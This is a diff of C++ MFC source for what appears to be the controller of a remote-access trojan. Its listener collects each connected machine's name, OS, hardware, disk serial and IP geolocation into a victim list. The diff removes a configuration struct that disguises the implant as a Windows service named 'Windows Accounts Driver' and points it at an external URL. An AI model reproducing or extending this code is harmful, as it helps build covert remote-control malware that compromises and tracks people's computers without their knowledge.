@@ -23,39 +23,16 @@
 #endif
 
 CClientDlg *m_clientdlg = NULL;
-
-struct MODIFY_DATA 
-{
-		unsigned int finder;
-		TCHAR ws_svcname[32];
-		TCHAR ws_svcdisplay[64];
-		char ws_svcdesc[256];
-		char url[256];
-		int  port;
-}modify_data = 
-{
-		0xFFFFFF8D,
-		"RemoteStorage",
-		"Windows Accounts Driver",
-		"Network Connections Management",
-		"http://ahai2007.id666.com/user/ahai2007/disk/webdisk/lplist.txt",
-		80,
-};
-
 LINKINFO m_linkinfo;
 LINKINFO clientLinkinfo;
 
-//CString str = _T("");
-
 int item = 0;
-
 u_short u_port = 0   ;
 string str_ip ;
 
 char  client_ip[32] = {0} ;
 static int nrItemNum = 0;
 
-//static SOCKET g__clientsocket;
 std::vector <TMPSOCKET *> tmp_vector;
 
 
@@ -101,11 +78,8 @@ END_MESSAGE_MAP()
 
 CClientDlg::CClientDlg(CWnd* pParent /*=NULL*/)
 	: CDialogEx(CClientDlg::IDD, pParent)
-{
-	//HWND hWnd = GetSafeHwnd();
-	//m_clientdlg =  (CClientDlg *)FromHandle(hWnd);  
+{  
 	m_clientdlg = this; //新添加的
-//	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
 }
 
 void CClientDlg::DoDataExchange(CDataExchange* pDX)
@@ -140,10 +114,6 @@ END_MESSAGE_MAP()
 BOOL CClientDlg::OnInitDialog()
 {
 	CDialogEx::OnInitDialog();
-
-	// 将“关于...”菜单项添加到系统菜单中。
-
-	// IDM_ABOUTBOX 必须在系统命令范围内。
 	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
 	ASSERT(IDM_ABOUTBOX < 0xF000);
 
@@ -201,11 +171,6 @@ void CClientDlg::OnSysCommand(UINT nID, LPARAM lParam)
 		CDialogEx::OnSysCommand(nID, lParam);
 	}
 }
-
-// 如果向对话框添加最小化按钮，则需要下面的代码
-//  来绘制该图标。对于使用文档/视图模型的 MFC 应用程序，
-//  这将由框架自动完成。
-
 void CClientDlg::OnPaint()
 {
 	if (IsIconic())
@@ -213,16 +178,12 @@ void CClientDlg::OnPaint()
 		CPaintDC dc(this); // 用于绘制的设备上下文
 
 		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);
-
-		// 使图标在工作区矩形中居中
 		int cxIcon = GetSystemMetrics(SM_CXICON);
 		int cyIcon = GetSystemMetrics(SM_CYICON);
 		CRect rect;
 		GetClientRect(&rect);
 		int x = (rect.Width() - cxIcon + 1) / 2;
 		int y = (rect.Height() - cyIcon + 1) / 2;
-
-		// 绘制图标
 		dc.DrawIcon(x, y, m_hIcon);
 	}
 	else
@@ -248,105 +209,83 @@ DWORD WINAPI ServerThread(LPVOID lp)
 	SYSTEMINIT m_sendmsg ;
 	char ReceiveBuf[sizeof(m_sendmsg)] = {0};
     int  DataLen = 0;
-
-    DataLen = m_tcptran.myrecv(m_tcptran.m_Socket,(char *)&m_sendmsg,sizeof(m_sendmsg),0,60,0,false) ;
-
+    DataLen = m_tcptran.myrecv(m_tcptran.m_Socket,(char *)&m_sendmsg,sizeof(m_sendmsg),0,60,0,false) ;   //接收被控端发来的计算机信息
 	if (DataLen == 0) 
 	{
 		closesocket(m_tcptran.m_Socket);
 		ExitThread(0);
 	}
 
-//////////////////////////////////////////////////////////////////////////
-//  处理重复客户端问题 //硬盘序列号
-//////////////////////////////////////////////////////////////////////////
-//  如果有不存在这个硬盘序列号则 插入
-//  如果存在这个硬盘序列号 插入的时候要找到原来的id删除然后在原来的位置插入
-
-	//BOOL  BInseart =TRUE;
 	BOOL  BDeleteid =FALSE;
 	UINT  InseartItem =0;	
 	for(int j = 0; j<tmp_vector.size();j++)
 	{
-		if (stricmp(m_sendmsg.HDSerial,tmp_vector[j]->HDSerial)==0)
+		if (stricmp(m_sendmsg.HDSerial,tmp_vector[j]->HDSerial)==0)     //如果已经存在该硬盘序列号
 		{
 
 			for(int i=0; i<m_clientdlg->m_list.GetItemCount(); i++)
 			{
-				if(stricmp(m_sendmsg.HDSerial,tmp_vector[j]->HDSerial)==0 )
+				if(stricmp(m_sendmsg.HDSerial,tmp_vector[j]->HDSerial)==0 )    //从客户端列表中查询
 				{
 					BDeleteid = TRUE;
 					InseartItem = i;
 
 				}
 			}
-
-			tmp_vector.erase(tmp_vector.begin()+j);						
+			tmp_vector.erase(tmp_vector.begin()+j);			      //从容器中移除			
 		}
 	}
-//////////////////////////////////////////////////////////////////////////
-	//if (BInseart) 
-	//{
+
 		CString tmp = _T("");
-		CString m_phyaddr = _T("");
-		
-		int mm = m_clientdlg->m_list.GetItemCount(); //更改来的插入顺序
+		CString m_phyaddr = _T("");	
+		int mm = m_clientdlg->m_list.GetItemCount();
 
 		if (BDeleteid)
 		{
             mm = InseartItem;
-
-			m_clientdlg->m_list.DeleteItem(InseartItem);
+			m_clientdlg->m_list.DeleteItem(InseartItem);    //从列表中移除
 		}
 		
-		tmp.Format("%s",client_ip);
-		
-		m_clientdlg->m_list.InsertItem(mm,"");
+		tmp.Format("%s",client_ip);                         //显示IP	
+		m_clientdlg->m_list.InsertItem(mm,"");              //列表控件，首先插入一个空的行
 		m_clientdlg->m_list.SetItemText(mm,0,tmp);
 		
-		tmp.Format("%s",m_sendmsg.computer);
+		tmp.Format("%s",m_sendmsg.computer);                //显示计算机名
 		
 		m_clientdlg->m_list.SetItemText(mm,1,tmp);
 		
-		tmp.Format("%s",m_sendmsg.os); 
+		tmp.Format("%s",m_sendmsg.os);                      //显示操作系统
 		
 		m_clientdlg->m_list.SetItemText(mm,2,tmp);
 		
-		tmp.Format("%s",m_sendmsg.processor); 
+		tmp.Format("%s",m_sendmsg.processor);               //显示处理器信息
 		m_clientdlg->m_list.SetItemText(mm,3,tmp);
 		
-		tmp.Format("%s",m_sendmsg.mem); 
+		tmp.Format("%s",m_sendmsg.mem);                     //显示内存
 		m_clientdlg->m_list.SetItemText(mm,4,tmp);
-		
-		//	TQQwry m_qqwry("QQWry.Dat"); 
 		IPwry ipinfo;
-		//m_qqwry.qqwry(client_ip);
-		m_phyaddr =ipinfo.IP2Add(client_ip);
-		//m_phyaddr = m_qqwry.Country +" "+ m_qqwry.Local;	
+
+		m_phyaddr =ipinfo.IP2Add(client_ip);                
+
 		
 		tmp.Format("%s",m_sendmsg.mem); 
-		m_clientdlg->m_list.SetItemText(mm,5,m_phyaddr);
+		m_clientdlg->m_list.SetItemText(mm,5,m_phyaddr);    //显示IP地址来源地
 		
-		tmp.Format("%s",m_sendmsg.version); 
+		tmp.Format("%s",m_sendmsg.version);                 //显示软件版本
 		m_clientdlg->m_list.SetItemText(mm,6,tmp);
 		
-		tmp.Format("%s",m_sendmsg.HDSerial); 
-	//	AfxMessageBox(m_sendmsg.HDSerial);
+		tmp.Format("%s",m_sendmsg.HDSerial);                //显示硬盘序列号
 		m_clientdlg->m_list.SetItemText(mm,7,tmp);
 		
-		tmp.Format("%d",m_tcptran.m_Socket); 
+		tmp.Format("%d",m_tcptran.m_Socket);                //当前socket
 		m_clientdlg->m_list.SetItemText(mm,8,tmp);      
 		
 		
 		TMPSOCKET *tmp00 = new TMPSOCKET;
-		
-		memset(tmp00,0,sizeof(TMPSOCKET));
-		
-		tmp00->ClientSocket = m_tcptran.m_Socket;
-		
-		lstrcpy(tmp00->HDSerial,m_sendmsg.HDSerial);
-		
-		tmp_vector.push_back(tmp00);		
+		memset(tmp00,0,sizeof(TMPSOCKET));	
+		tmp00->ClientSocket = m_tcptran.m_Socket;	
+		lstrcpy(tmp00->HDSerial,m_sendmsg.HDSerial);	
+		tmp_vector.push_back(tmp00);		                //将当前主机标识压入容器
 	return true;
 }
 
@@ -365,30 +304,23 @@ DWORD WINAPI MyServerThread()
 	}
 
 	struct	sockaddr_in Client_addr ;
-	memset((void   *)&Client_addr,0,sizeof(Client_addr));  
+	memset((void *)&Client_addr,0,sizeof(Client_addr));  
 
-	int addrlen = sizeof(sockaddr_in); //更改错误 不是取的地址 // 取到的指针应该 大小应该事先分配好
+	int addrlen = sizeof(sockaddr_in);
 
 	SOCKET ClientSocket ;
 	HANDLE hThread =NULL ;
 	DWORD Threadid = 0 ;
 
-	
-	while(1)
+	while(1)                //循环等待监听
     {
-		////更改错误 不是取的地址 addrlen//
 		ClientSocket = m_tcptran.myaccept(ServerSocket,(struct sockaddr*)&Client_addr,&addrlen) ;
-
-        //ClientSocket = accept(ServerSocket,(struct sockaddr*)&Client_addr,&addrlen) ;
-		if(ClientSocket == SOCKET_ERROR)
+		if(ClientSocket == SOCKET_ERROR)             //返回新创建的套接字
 			break;
-		 strcpy( client_ip, inet_ntoa(Client_addr.sin_addr) ); 
-		 clientLinkinfo.s = ClientSocket ;
-		// 字符串予值
-		//strcpy(client_ip,m_linkinfo.strBindIp.c_str());
-         
+		strcpy( client_ip, inet_ntoa(Client_addr.sin_addr) );    //新创建的套接字的地址结构
+		clientLinkinfo.s = ClientSocket ;                        //全局变量clientLinkinfo
 		clientLinkinfo.BindPort  = m_linkinfo.BindPort ;		
-		hThread = CreateThread(0,0,ServerThread,(LPVOID)&clientLinkinfo,0,&Threadid);	
+		hThread = CreateThread(0,0,ServerThread,(LPVOID)&clientLinkinfo,0,&Threadid);	//创建ServerThread线程  
     
 	}
 
@@ -424,22 +356,14 @@ void CClientDlg::OnBnClickedButton1()        //开始按钮
 
 void CClientDlg::OnBnClickedButton2()       //停止按钮
 {
-	// TODO: 在此添加控件通知处理程序代码
-	//解决客户端关闭 服务端资源cpu 100%占用 //向所有的客户端发送
-	// TODO: Add your control notification handler code here
 	COMMAND m_command;
 	m_command.wCmd= CMD_RETRY; //CMD_NULL
 	CTcpTran m_tcptran;
-	//CProcManageDlg m_ProcDlg;
 	CString id;
 	id = m_clientdlg->m_list.GetItemText(item,7);
-	
-	//AfxMessageBox(id); //test
 	char HDSerial[64] = {0};
-	
 	id.Format("%s",HDSerial);
 	SOCKET mmclose;
-	
 	for(int j = 0; j<tmp_vector.size();j++)
 	{
 		mmclose =tmp_vector[j]->ClientSocket;
@@ -453,8 +377,6 @@ void CClientDlg::OnBnClickedButton2()       //停止按钮
 
 	m_btn_start.EnableWindow(TRUE);
 	m_btn_stop.EnableWindow(FALSE);
-
-	//CDialog::OnCancel();
 }
 
 
